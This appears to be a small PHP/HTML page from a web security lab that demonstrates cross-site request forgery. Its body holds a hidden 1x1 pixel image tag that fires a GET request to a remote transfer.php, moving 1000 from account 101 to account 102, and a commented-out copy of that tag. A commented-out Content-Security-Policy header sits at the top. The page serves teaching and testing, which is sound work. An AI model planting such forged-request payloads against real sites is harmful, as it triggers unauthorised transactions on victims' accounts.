<?php 

/*
$csp = <<<csp
Content-Security-Policy:
default-src 'self';
img-src 'self';
object-src media1.example.com *.cdn.example.com;
script-src trustedscripts.example.com
csp;

header($csp);
*/

?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Lab</title>
<?php require("script_css.php") ?>
</head>
<body>
	<div id="labPage" data-role="page" data-theme="d">
		<p>An article, an image and an accdient.</p>

		<img src="http://www.beauty.com/Lab/CSRF/transfer.php?fromID=101&toID=102&money=1000" 
		 style="width:1px;height:1px;" />		

		<!-- 
		<img src="transfer.php?fromID=101&toID=102&money=1000" 
		 style="width:1px;height:1px;" />
 -->
	</div>
	<!-- page -->

</body>
</html>
